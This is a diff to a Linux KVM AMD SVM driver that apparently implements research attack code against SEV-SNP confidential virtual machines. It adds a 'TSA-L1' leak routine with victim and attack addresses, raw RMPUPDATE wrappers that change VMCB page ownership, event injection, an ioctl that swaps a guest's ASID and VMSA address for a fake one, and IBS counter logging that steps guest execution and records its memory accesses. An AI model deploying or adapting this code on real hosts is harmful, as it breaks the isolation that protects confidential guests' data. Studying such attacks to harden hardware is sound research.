@@ -64,6 +64,10 @@
 #include <asm/io.h>
 #include <linux/cpu.h>
 #include <asm/processor.h>
+#include <linux/psp.h>
+
+#include "mmu/tdp_mmu.h"
+#include <asm/sev.h>
 
 #include "trace.h"
 
@@ -2902,14 +2906,14 @@ static int __maybe_unused emulate_svm_instr(struct kvm_vcpu *vcpu, int opcode)
  */
 static int gp_interception(struct kvm_vcpu *vcpu)
 {
-	if(!move_next_instruction())
-	{
-		pr_info("[Fuzzer] Finished fuzzing all instructions in the range\n");
-		ibs_log_finish();
-		return 1;
-	}
-	write_instr(vcpu, REGISTER_VALUE, 0);
-	reset_state(vcpu);
+	// if(!move_next_instruction())
+	// {
+	// 	pr_info("[Fuzzer] Finished fuzzing all instructions in the range\n");
+	// 	ibs_log_finish();
+	// 	return 1;
+	// }
+	// write_instr(vcpu, REGISTER_VALUE, 0);
+	// reset_state(vcpu);
 	return 1;
 }
 
@@ -4834,7 +4838,7 @@ static void ibs_apic_exit(void *info)
 	preempt_enable();
 }
 
-static u64 __maybe_unused offset = 0x0;
+static u64 __maybe_unused guest_pa = 0x0;
 static u64 __maybe_unused ibs_uop_counter = 0;
 
 static __always_inline uint64_t measure_access_time(const uint8_t *addr)
@@ -4905,7 +4909,6 @@ static const struct pmc_candidate candidates[] = { { 0xD2, 0x24 },
 #define BASE_VA 0xFF00000000000000ull
 
 #define PAGE_OFFSET_CACHED 0x1F8 //vmsa->rax
-
 static uint64_t PHYS_BASE = 0;
 static uint64_t VICTIM_VA = 0;
 static uint64_t ATTACK_VA = 0;
@@ -5016,12 +5019,6 @@ static noinline __aligned(4096) uint64_t
 	asm volatile("invlpg (%0)" ::"r"((uint8_t *)((u64)target & PAGE_MASK))
 		     : "memory");
 
-	svm_vmrun->vmcb->control.event_inj =
-		(1U << 31) | (5U << 28) | // invalid type
-		(1U << 11) |
-		0x400; // low bits become vector field, not exit code
-
-	svm_vmrun->vmcb->control.event_inj_err = 0;
 
 	if (victim) {
 		__asm__ volatile("movq (%0),%%rax" ::"r"(victim)
@@ -5309,7 +5306,79 @@ static int kthread_tsa_main(void *data)
 }
 
 static u64 leak_rax = 0;
-static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu,
+
+#define BYTES_PER_LINE 16
+static void __maybe_unused hexdump(const void *addr, size_t len)
+{
+    const unsigned char *ptr = addr;
+    size_t i, j;
+
+    for (i = 0; i < len; i += BYTES_PER_LINE)
+    {
+        printk(KERN_INFO "%08lx: ", (unsigned long)(ptr + i));
+        for (j = 0; j < BYTES_PER_LINE; j++)
+        {
+            if (i + j < len)
+                printk(KERN_CONT "%02x ", ptr[i + j]);
+            else
+                printk(KERN_CONT "   ");
+        }
+
+        printk(KERN_CONT " | \n");
+    }
+}
+static u64 __maybe_unused rmpupdate_pre_guest(u64 paddr, u32 asid){
+	struct rmp_state state = {0};
+	u64 ret;
+
+	state.assigned = 1;
+	state.pagesize = 0;
+	state.immutable = 0;
+	state.asid = asid;
+	
+	do {
+		/* Binutils version 2.36 supports the RMPUPDATE mnemonic. */
+		asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
+			     : "=a" (ret)
+			     : "a" (paddr), "c" ((unsigned long)&state)
+			     : "memory", "cc");
+	} while (ret == RMPUPDATE_FAIL_OVERLAP);
+
+	return ret;
+}
+
+static u64 rmpupdate_pre_hv(u64 paddr)
+{
+	struct rmp_state state = {0};
+	u64 ret;
+
+	state.assigned = 0;   /* hypervisor-owned / shared */
+	state.pagesize = 0;   /* 4K page */
+	state.immutable = 0;
+	state.asid = 0;
+
+	do {
+		asm volatile(".byte 0xF2, 0x0F, 0x01, 0xFE"
+			     : "=a" (ret)
+			     : "a" (paddr), "c" ((unsigned long)&state)
+			     : "memory", "cc");
+	} while (ret == RMPUPDATE_FAIL_OVERLAP);
+
+	return ret;
+}
+
+static inline u64 __maybe_unused set_c_bit(u64 val)
+{
+    return val | (1ULL << 51) ;
+}
+
+static inline u64 __maybe_unused clear_c_bit(u64 val)
+{
+	return val & ~(1ULL << 51) ;
+}
+
+
+static noinstr void __maybe_unused svm_vcpu_enter_exit_tsa(struct kvm_vcpu *vcpu,
 					bool spec_ctrl_intercepted)
 {
 	struct svm_cpu_data *sd = per_cpu_ptr(&svm_data, vcpu->cpu);
@@ -5336,8 +5405,33 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu,
 		goto run_vm;
 	}
 
+	function_address = (u64) __svm_sev_es_vcpu_run;
+	recover_address = function_address + 0x4f;
+
+
+	void* vmcb_save = kmalloc(0x1000, GFP_KERNEL);
+	memcpy(vmcb_save, svm->current_vmcb->ptr, 0x1000);
+
+	//immediately cause #GP
+	svm->vmcb->control.event_inj = 
+						(1U << 31) | 	// valid
+				       	(3U << 8)  | 	// type = exception
+				       	(1U << 11) | 	// error-code valid
+				       	13; 			// vector = #GP
+
+	svm->vmcb->control.event_inj_err = 0;
+
+	int ret = rmpupdate_pre_guest(svm->current_vmcb->pa, 0x1);
+	if (ret) {
+		pr_err("RMPUPDATE failed with error code: %d\n", ret);
+		goto run_vm;
+	}else {
+		pr_info("RMPUPDATE succeeded, VMCB not hypervisor owned\n");
+	}
+
 	leak_rax = 0;
 	pr_info("TSA-L1 Module Loaded.\n");
+
 
 	spec_ctrl_intercepted_vmrun = spec_ctrl_intercepted;
 	svm_vmrun = svm;
@@ -5352,16 +5446,20 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu,
 	VICTIM_VA = BASE_VA + PHYS_BASE;
 	ATTACK_VA = (BASE_VA + PHYS_BASE) ^ mask;
 
-	pr_info("[*] Reserved Physical Base: 0x%llx\n", PHYS_BASE);
+	pr_info("[*] Leaking Physical Base: 0x%llx\n", PHYS_BASE);
 	pr_info("[*] Mapped Victim VA: 0x%llx\n", VICTIM_VA);
 	pr_info("[*] Mapped Attack VA: 0x%llx\n", ATTACK_VA);
 
 	kthread_tsa_main(NULL);
 
-	svm->vmcb->control.event_inj = (1U << 31) | (5U << 28) | // invalid type
-				       (1U << 11) | 0x400;
+	ret = rmpupdate_pre_hv(svm->current_vmcb->pa);
+	if (ret) {
+		pr_err("RMPUPDATE to hypervisor-owned failed with error code: %d\n", ret);
+	} else {
+		pr_info("RMPUPDATE to hypervisor-owned succeeded\n");
+	}
 
-	svm->vmcb->control.event_inj_err = 0;
+	memcpy(svm->current_vmcb->ptr, vmcb_save, 0x1000);
 
 run_vm:
 	__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
@@ -5369,6 +5467,372 @@ run_vm:
 
 	raw_local_irq_disable();
 
+	guest_state_exit_irqoff();
+}
+
+
+#define IBS_OP_CTL				0xc0011033
+#define IBS_OP_RIP				0xc0011034
+#define IBS_OP_DATA				0xc0011035
+#define IBS_OP_DATA2			0xc0011036
+#define IBS_OP_DATA3			0xc0011037
+#define IBS_DC_LIN_AD			0xc0011038
+#define IBS_DC_PHYS_AD			0xc0011039
+#define IBS_CONTROL				0xc001103a
+#define BP_IBSTGT_RIP			0xc001103b
+
+#define IBS_LVT_OFFSET_VALID	(1ULL << 8)
+#define IBS_LVT_OFFSET_MASK		(0xf)
+
+// Function to read an MSR
+static __always_inline uint64_t __read_msr(uint32_t msr_register) {
+    uint64_t msr_value;
+    uint32_t low, high;
+
+    asm volatile(
+        "rdmsr"
+        : "=a"(low), "=d"(high)  // Output operands
+        : "c"(msr_register)      // Input operand
+    );
+
+    msr_value = ((uint64_t)high << 32) | low;
+    return msr_value;
+}
+
+// Function to write an MSR
+static __always_inline void __write_msr(uint32_t msr_register, uint64_t msr_value) {
+    uint32_t low = (uint32_t)msr_value;
+    uint32_t high = (uint32_t)(msr_value >> 32);
+
+    asm volatile(
+        "wrmsr"
+        :                                         // No output operands
+        : "c"(msr_register), "a"(low), "d"(high)  // Input operands
+    );
+}
+
+
+typedef union ibs_opt_ctrl {
+    struct {
+        u64 IbsOpMaxCnt2 : 16;    // 15:0
+        u64 IbsOpL3MissOnly : 1;  // 16
+        u64 IbsOpEn : 1;          // 17
+        u64 IbsOpValid : 1;       // 18
+        u64 IbsOpCntCtl : 1;      // 19
+        u64 IbsOpMaxCnt1 : 7;     // 26:20
+        u64 rsvd2 : 5;            // 31:27
+        u64 IbsOpCurCnt : 27;     // 58:32
+        u64 rsvd1 : 5;            // 63:59
+    };
+    u64 value;
+} ibs_opt_ctrl;
+
+char *memwithStrings[] = {"0 ","1 ", "2 ", "4 ", "8 ", "16", "32", "64", "?8", "?9", "?A", "?B", "?C", "?D", "?C", "?E", "?F"};
+
+static void __maybe_unused write_ibs_ctrl(u64 instruction_offset) {
+    ibs_opt_ctrl ibs_op_ctl_data;
+    ibs_op_ctl_data.value = __read_msr(IBS_OP_CTL);
+
+    ibs_op_ctl_data.value = 0;
+
+    ibs_op_ctl_data.IbsOpMaxCnt1 = (1 << 5);
+    ibs_op_ctl_data.IbsOpCurCnt = (1 << 25) - instruction_offset;
+    ibs_op_ctl_data.IbsOpCntCtl = 1;
+    ibs_op_ctl_data.IbsOpEn = 1;
+    __write_msr(IBS_OP_CTL, ibs_op_ctl_data.value);
+}
+
+static void __maybe_unused read_ibs_ctrl(u64 uop_cnt) {
+    ibs_opt_ctrl ibs_op_ctl_data;
+    ibs_op_ctl_data.value = __read_msr(IBS_OP_CTL);
+
+    u64 rip_value;
+    rip_value = __read_msr(IBS_OP_RIP);
+
+    union ibs_op_data opData1;
+    opData1.val = __read_msr(IBS_OP_DATA);
+
+    union ibs_op_data3 opData3;
+    opData3.val = __read_msr(IBS_OP_DATA3);
+
+    u64 lin_addr = __read_msr(IBS_DC_LIN_AD);
+    u64 phys_addr = __read_msr(IBS_DC_PHYS_AD);
+
+   
+    if (ibs_op_ctl_data.IbsOpValid) {
+        if (opData3.ld_op == 1 || opData3.st_op == 1) {
+            pr_info("[RIP: 0x%016llx][uop cnt: %lld] [%6s%s] 0x%016llx (v=0x%016llx) UC[%s] WC[%s] CacheMiss [%s] tagToRetire [%4d] compToRetire [%4d] \n",rip_value ,uop_cnt, opData3.ld_op ? "load" : "store", memwithStrings[opData3.op_mem_width], phys_addr, lin_addr,  opData3.dc_wc_mem_acc ? "+" : "-", opData3.dc_uc_mem_acc ? "+" : "-", opData3.dc_miss ? "+" : "-",opData1.comp_to_ret_ctr, opData1.tag_to_ret_ctr);
+		} else {
+            //pr_info("[RIP: 0x%016llx][uop cnt: %lld] [%8s] Branch[%3s] tagToRetire [%4d] compToRetire [%4d] micro [%3s] multiOP [%3s]\n",rip_value, uop_cnt, "ALU", opData1.op_brn_ret ? "yes" : "no" , opData1.comp_to_ret_ctr, opData1.tag_to_ret_ctr, opData1.op_microcode ? "yes" : "no", opData1.op_brn_fuse ? "yes" : "no" );
+        }
+    }
+
+    ibs_op_ctl_data.value = 0;
+    __write_msr(IBS_OP_CTL, ibs_op_ctl_data.value);
+    __write_msr(IBS_OP_DATA, 0);
+    __write_msr(IBS_OP_DATA2, 0);
+    __write_msr(IBS_OP_DATA3, 0);
+    __write_msr(IBS_DC_LIN_AD, 0);
+    __write_msr(IBS_DC_PHYS_AD, 0);
+    __write_msr(IBS_OP_RIP, 0);
+    __write_msr(BP_IBSTGT_RIP, 0);
+}
+
+struct psp_sev_cmd_move {
+	u64 gctx_paddr;
+	u32 page_size:1;
+	u32 reserved:31;
+	u32 reserved1;
+	u64 src_paddr;
+	u64 dst_paddr;
+} __packed;
+
+static int __maybe_unused psp_move_page(struct kvm *kvm, u64 hpa_src, u64 hpa_dst)
+{
+	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+	struct psp_sev_cmd_move data = {0};
+	u32 error = 0;
+	int ret;
+
+	if (!sev || !sev->snp_context)
+		return -EINVAL;
+
+	if (!IS_ALIGNED(hpa_src, PAGE_SIZE) || !IS_ALIGNED(hpa_dst, PAGE_SIZE))
+		return -EINVAL;
+
+	data.gctx_paddr = __psp_pa(sev->snp_context);
+	data.page_size = 0; /* 4 KiB */
+	data.src_paddr = hpa_src;
+	data.dst_paddr = hpa_dst;
+
+	pr_info("SNP_PAGE_MOVE gctx=%llx src=%llx dst=%llx asid=%u\n",
+		data.gctx_paddr, data.src_paddr, data.dst_paddr, sev->asid);
+
+	ret = sev_do_cmd(SEV_CMD_SNP_PAGE_MOVE, &data, &error);
+
+	pr_info("SNP_PAGE_MOVE ret=%d fw_error=0x%x\n", ret, error);
+	return ret;
+}
+
+static int __maybe_unused __sev_issue_cmd(int fd, int id, void *data, int *error)
+{
+	CLASS(fd, f)(fd);
+
+	if (fd_empty(f))
+		return -EBADF;
+
+	return sev_issue_cmd_external_user(fd_file(f), id, data, error);
+}
+
+static int __maybe_unused sev_issue_cmd(struct kvm *kvm, int id, void *data, int *error)
+{
+	struct kvm_sev_info *sev = to_kvm_sev_info(kvm);
+
+	return __sev_issue_cmd(sev->fd, id, data, error);
+}
+
+static unsigned int __maybe_unused sev_get_asid(struct kvm *kvm)
+{
+	return to_kvm_sev_info(kvm)->asid;
+}
+
+static int __maybe_unused snp_bind_asid(struct kvm *kvm, int *error)
+{
+	struct kvm_sev_info *sev = to_kvm_sev_info(kvm);
+	struct sev_data_snp_activate data = {0};
+
+	data.gctx_paddr = __psp_pa(sev->snp_context);
+	data.asid = sev_get_asid(kvm);
+	return sev_issue_cmd(kvm, SEV_CMD_SNP_ACTIVATE, &data, error);
+}
+
+
+static int __maybe_unused make_vmsa(struct kvm *kvm, u64 vmsa_pa, int *error)
+{
+	struct kvm_sev_info *sev = to_kvm_sev_info(kvm);
+	struct sev_data_snp_launch_update data = {};
+
+	data.gctx_paddr = __psp_pa(sev->snp_context);
+	data.page_type = SNP_PAGE_TYPE_VMSA;
+	data.address = vmsa_pa;
+	return sev_issue_cmd(kvm, SEV_CMD_SNP_LAUNCH_UPDATE, &data, error);
+}
+
+
+struct user_space_args {
+	u32 asid;
+	u64 vmsa_pa;
+	u8 fail;
+	u8 leak_rax;
+	u32 cpu;
+	u64 vmcb_pa;
+};
+
+static struct user_space_args user_args;
+
+static inline u64 set_asid_bits(u64 val, u8 asid)
+{
+    /* Clear bits 46–53 */
+    val &= ~(0xFFULL << 46);
+
+    /* Set new ASID (only lower 8 bits used) */
+    val |= ((u64)(asid & 0xFF) << 46);
+
+    // val |= (1ULL << 51);
+    return val;
+}
+
+static noinstr void __maybe_unused svm_vcpu_enter_exit(struct kvm_vcpu *vcpu, bool spec_ctrl_intercepted)
+{
+	struct svm_cpu_data *sd = per_cpu_ptr(&svm_data, vcpu->cpu);
+	struct vcpu_svm *svm = to_svm(vcpu);
+	struct kvm_sev_info *sev = &to_kvm_svm(vcpu->kvm)->sev_info;
+	ibs_apic_exit(NULL);
+	guest_state_enter_irqoff();
+
+	raw_local_irq_enable();
+
+	amd_clear_divider();
+
+	if (!leak_rax) {
+		goto run_vm;
+	}
+
+	if (svm->current_vmcb->pa != user_args.vmcb_pa) {
+		goto exit;
+	}
+
+	function_address = (u64) __svm_sev_es_vcpu_run;
+	recover_address = function_address + 0x4f;
+
+	// void* victim_vmcb = kmalloc(0x1000, GFP_KERNEL);
+	// map_physical_to_virtual(user_args.vmcb_pa, (u64)victim_vmcb, 0);
+
+	// void* victim_vmcb_copy = kmalloc(0x1000, GFP_KERNEL);
+	// memcpy(victim_vmcb_copy, victim_vmcb, 0x1000);
+
+	void* vmcb_copy = kmalloc(0x1000, GFP_KERNEL);
+	u64 vmsa_copy = svm->vmcb->control.vmsa_pa;
+	// u64 original_vmcb_pa = svm->current_vmcb->pa;
+	u32 old_asid = sev->asid;
+	(void)old_asid;
+	memcpy(vmcb_copy, svm->current_vmcb->ptr, 0x1000);
+
+	/*
+	3b0: SEV_FEATURES
+	0ca: VMPL
+	3c8: VIRTUAL_TOM
+	*/
+
+	// u64 spte;
+	// u64 *sptep;
+	// rcu_read_lock();
+	// sptep = kvm_tdp_mmu_fast_pf_get_last_sptep(vcpu, user_args.vmsa_pa >> PAGE_SHIFT, &spte);
+	// rcu_read_unlock();
+	// PHYS_BASE = spte & 0x0000FFFFFFFFF000ULL;
+
+	// svm->vmcb->control.vmsa_pa = PHYS_BASE;
+	// int error;
+	// int ret = make_vmsa(vcpu->kvm, PHYS_BASE, &error);
+	// if (ret) {
+	// 	pr_err("Failed to create VMSA with RMPUPDATE, ret = %d, error = 0x%x\n", ret, error);
+	// 	goto run_vm;
+	// } else {
+	// 	pr_info("Successfully created VMSA with RMPUPDATE\n");
+	// }
+
+
+	if (user_args.fail)
+	{
+		sev->asid = user_args.asid;
+		svm->vmcb->control.asid = sev->asid;
+		svm->vmcb->control.vmsa_pa = user_args.vmsa_pa;
+
+		// memcpy(victim_vmcb, svm->current_vmcb->ptr, 0x1000);
+		// svm->current_vmcb->pa = user_args.vmcb_pa;
+	}
+	
+
+	// vmcb_va->control.asid = sev->asid;
+	// vmcb_va->control.vmsa_pa = user_args.vmsa_pa;
+
+
+	// if(user_args.fail){
+	// 	pr_info("Injecting #UD to cause VMRUN failure\n");
+	// 	svm->vmcb->control.event_inj =	(1U << 31) | 
+	// 								(5U << 28) | 	// invalid type
+	// 								(1U << 11) |
+	// 								0x400; 
+
+	// 	svm->vmcb->control.event_inj_err = 0;
+	// }
+
+	// void* new_vmsa = kmalloc(0x1000, GFP_KERNEL);
+
+	// int ret = rmpupdate_pre_guest(virt_to_phys(new_vmsa), sev->asid + 3);
+	// if (ret) {
+	// 	pr_err("RMPUPDATE for new VMSA failed with error code: %d\n", ret);
+	// 	kfree(new_vmsa);
+	// 	goto run_vm;
+	// } else {
+	// 	pr_info("RMPUPDATE for new VMSA succeeded\n");
+	// }
+	// svm->vmcb->control.vmsa_pa = virt_to_phys(new_vmsa);
+
+
+repeat:
+	if(ibs_uop_counter  == 0){
+		pr_info("VMCB PA 0x%lx",svm->current_vmcb->pa);
+		pr_info("Original VMSA PA 0x%llx", vmsa_copy);
+		pr_info("Fake VMSA PA 0x%llx",svm->vmcb->control.vmsa_pa);
+		pr_info("ASID %u", sev->asid);
+
+	}
+		
+		u64 instruction_value = ibs_uop_counter;
+		if(ibs_uop_counter <= MAX_INSTRUCTION_COUNT) {
+			write_ibs_ctrl(instruction_value);
+			READ_ONCE(((u8*)svm)[1]);
+			READ_ONCE(((u8*)svm)[2]);
+			READ_ONCE(((u8*)svm)[3]);
+			READ_ONCE(((u8*)svm)[4]);
+			READ_ONCE(((u8*)svm)[5]);
+			READ_ONCE(((u8*)svm)[6]);
+		}
+
+		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
+			      sev_es_host_save_area(sd));
+		
+
+		if(ibs_uop_counter <= MAX_INSTRUCTION_COUNT) {
+			READ_ONCE(((u8*)svm)[1]);
+			READ_ONCE(((u8*)svm)[2]);
+			READ_ONCE(((u8*)svm)[3]);
+			READ_ONCE(((u8*)svm)[4]);
+			READ_ONCE(((u8*)svm)[5]);
+			READ_ONCE(((u8*)svm)[6]);
+			read_ibs_ctrl(instruction_value);
+		}
+
+		ibs_uop_counter++;
+
+		if(ibs_uop_counter <= MAX_INSTRUCTION_COUNT)
+		{
+			goto repeat;
+		}
+	
+	// svm->current_vmcb->pa = original_vmcb_pa;
+	// memcpy(victim_vmcb, victim_vmcb_copy, 0x1000);
+
+	memcpy(svm->current_vmcb->ptr, vmcb_copy, 0x1000);
+	sev->asid = old_asid;
+	leak_rax = 0;
+run_vm:
+	__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
+			      sev_es_host_save_area(sd));
+	
+exit:
+	raw_local_irq_disable();
 	guest_state_exit_irqoff();
 }
 
@@ -6631,6 +7095,8 @@ static void __svm_exit(void)
 	kvm_x86_vendor_exit();
 }
 
+
+
 #define DEVICE_NAME "svm_ibs_dev"
 #define FUZZ_IOC_GET_STATE _IOR('a', 'c', cpu_state_t)
 #define FUZZ_IOC_SET_STATE _IOW('a', 'd', cpu_state_t)
@@ -6642,6 +7108,7 @@ static void __svm_exit(void)
 #define FUZZ_IOC_SET_GLOBAL_FUZZ_STATE _IOW('a', 'j', fuzzer_state_snapshot_t)
 #define FUZZ_IOC_GET_GLOBAL_FUZZ_STATE _IOR('a', 'k', fuzzer_state_snapshot_t)
 #define FUZZ_IOC_ACK_SET _IOW('a', 'l', uint64_t)
+#define FUZZ_IOC_SET_ARGS _IOW('a', 'm', struct user_space_args)
 
 
 static long fuzz_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
@@ -6716,12 +7183,20 @@ static long fuzz_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 		if (copy_from_user(&ack_value, (void __user *)arg, sizeof(ack_value)))
 			return -EFAULT;
 
-		offset = ack_value;
+		guest_pa = ack_value;
 		ibs_uop_counter = 0;
 		leak_rax = 1;
 
 		return 0;
 		set_ack_event(ack_value);
+		return 0;
+
+	case FUZZ_IOC_SET_ARGS:
+	
+		if (copy_from_user(&user_args, (void __user *)arg, sizeof(struct user_space_args)))
+			return -EFAULT;
+
+		leak_rax = user_args.leak_rax;
 		return 0;
     default:
         return -EINVAL;
